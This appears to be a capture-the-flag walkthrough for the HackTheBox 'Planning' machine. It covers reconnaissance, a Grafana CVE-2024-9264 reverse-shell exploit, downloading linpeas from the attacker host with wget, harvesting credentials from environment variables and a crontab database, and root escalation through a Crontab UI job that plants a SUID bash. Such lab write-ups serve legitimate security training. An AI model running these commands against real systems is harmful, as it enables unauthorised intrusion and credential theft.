# Planning: Easy

```sh
sudo vim /etc/hosts
# add planning.htb

nmap -T4 -p- -A -Pn -v planning.htb
```

* the box info gives us initial creds 'admin:0D5oT70Fq13EvB5r'

* open ports & services:

    * 22/tcp: ssh: OpenSSH 9.6p1 Ubuntu 3ubuntu13.11
    * 80/tcp: http: nginx 1.24.0

* we can try using the initial creds for SSH login, but that does not work obviously

* checking the webpage, we have a website for 'Edukate': an online education website

* we can explore the webpage further:

    * the homepage has a search option, and it does a POST call to '/index.php': but there seems to be no search results, so we can assume for now that it does not have anything associated with it

    * the page mentions the names of 3 instructors:

        * Rose Mary
        * Bob Moss
        * Stella Haks
    
    * the footer mentions an email 'info@planning.htb'

    * the page has links to other pages as checked from the source code:

        * /about.php
        * /course.php
        * /contact.php
        * /detail.php
    
    * the pages '/about.php' & '/course.php' do not have any interesting info; '/contact.php' contains a form but it does not do anything

    * the '/detail.php' page contains a link to enroll in the course at '/enroll.php'

    * the '/enroll.php' page contains a form with these fields: full name, email and phone number

    * checking the source code as well as submitting test data shows that only the email field is validated; and the other 2 fields can have any text

    * we can check the enroll form for possible injection attacks later

* web scan:

    ```sh
    feroxbuster -u http://planning.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,js,md --extract-links --scan-limit 3
    # recursive dir scan with small wordlist

    ffuf -c -u 'http://planning.htb' -H 'Host: FUZZ.planning.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 178 -s
    # subdomain scan

    gobuster dir -u http://planning.htb -w /usr/share/wordlists/dirb/big.txt -x txt,php,html,js,md -t 25
    # dir scan with big wordlist

    ffuf -c -u 'http://planning.htb' -H 'Host: FUZZ.planning.htb' -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 25 -fs 178 -s
    # subdomain scan with different wordlist
    ```

* the subdomain scan gives us a subdomain 'grafana.planning.htb': we can update this in ```/etc/hosts```

* checking the Grafana subdomain, we get a login page at 'http://grafana.planning.htb/login'

* the footer of the page mentions the Grafana version 11.0.0

* Googling for exploits associated with Grafana 11.0.0 leads to [CVE-2024-9264: a command injection and LFI vulnerability](https://nvd.nist.gov/vuln/detail/cve-2024-9264): but this has a few prerequisites:

    * any user with VIEWER of higher permission
    * 'duckdb' binary must be present in Grafana's ```$PATH``` for this to work (not installed by default)

* Googling shows Grafana default creds as 'admin:admin': but this does not work

* if we test the creds given for this box: 'admin:0D5oT70Fq13EvB5r': it works and we are able to view the Grafana dashboard page

* Googling for exploits and POCs for CVE-2024-9264 leads to [this RCE exploit script](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit): we can check if this works:

    ```sh
    # setup listener
    nc -nvlp 4444

    # download and run the Python script
    python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.95 --reverse-port 4444
    ```

* the exploit works and we have a reverse shell as root:

    ```sh
    id
    # root

    hostname
    # randomly generated name
    # we are in a docker container

    pwd
    # '/usr/share/grafana'

    ls -la

    ls -la /
    # includes '.dockerenv' file

    ls -la /home
    # one user 'grafana'

    ls -la /home/grafana
    # empty

    cat /etc/passwd
    # no users on the box

    cat /etc/hosts
    # we have IP 172.17.0.2

    hostname -I
    # 172.17.0.2
    ```

* the Docker instance has the IP 172.17.0.2, which means the host would likely be 172.17.0.1

* we can first try enumeration using ```linpeas``` before attempting Docker container breakout: fetch the script from attacker:

    ```sh
    wget http://10.10.14.95:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* ```linpeas``` shows that the env variables includes some non-default data:

    * "GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!"
    * "GF_SECURITY_ADMIN_USER=enzo"

* using this info, we can try using the creds 'enzo:RioTecRANDEntANT!' to login via SSH: and it works:

    ```sh
    ssh enzo@planning.htb
    # this works

    ls -la

    cat user.txt
    # user flag

    sudo -l
    # not available
    ```

* we can attempt further enum using ```linpeas``` - fetch the script from attacker:

    ```sh
    wget http://10.10.14.95:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 6.8.0-59-generic, Ubuntu 24.04.2
    * sudo version 1.9.15p5
    * cleartext creds 'root:P4ssw0rdS0pRi0T3c' found for crontabs and crontab-UI
    * non-default files found in ```/opt```
    * ports 8000,3000,3306,46387,33060 listening locally

* we can try using the cleartext password for root via ```su``` or SSH login: but both methods fail

* checking the files in ```/opt```:

    ```sh
    ls -la /opt

    ls -la /opt/crontab

    cat /opt/crontab/crontab.db
    ```

* the 'crontab.db' file mentions the same cleartext password, and shows a cronjob (currently stopped) on the Docker container for Grafana backup:

    ```sh
    /usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz
    ```

* we can check the ports that are listening locally for any services: we can ignore ports 3306 & 33060 as they are for MySQL

* we can try accessing it on the attacker by SSH port forwarding:

    ```sh
    ssh -L 3000:127.0.0.1:3000 enzo@planning.htb

    ssh -L 8000:127.0.0.1:8000 enzo@planning.htb

    ssh -L 46387:127.0.0.1:46387 enzo@planning.htb
    ```

* now we can access these services on the attacker machine, on the same ports as the target

* the service on port 3000 is the Grafana login page, and the page for port 46387 gives a 404 Not Found error

* however, the webpage on port 8000 gives us a basic authentication prompt

* this could be for the crontab-ui service found earlier; we can try using the creds 'root:P4ssw0rdS0pRi0T3c'

* these creds work and we are able to access the Crontab UI dashboard

* the dashboard allows us to create a new cronjob with the command to run

* we can create a new test cronjob, use a malicious command like ```cp /bin/bash /tmp/bash; chmod +s /tmp/bash```, and set it to run every minute

* once the job is created, we even have an option to 'run now': using this we can trigger the command immediately

* after this, we have the ```bash``` binary with SUID bit set:

    ```sh
    ls -la /tmp
    # we have 'bash' with SUID here

    /tmp/bash -p
    # this gives us a root shell

    id
    # root

    cat /root/root.txt
    # root flag
    ```
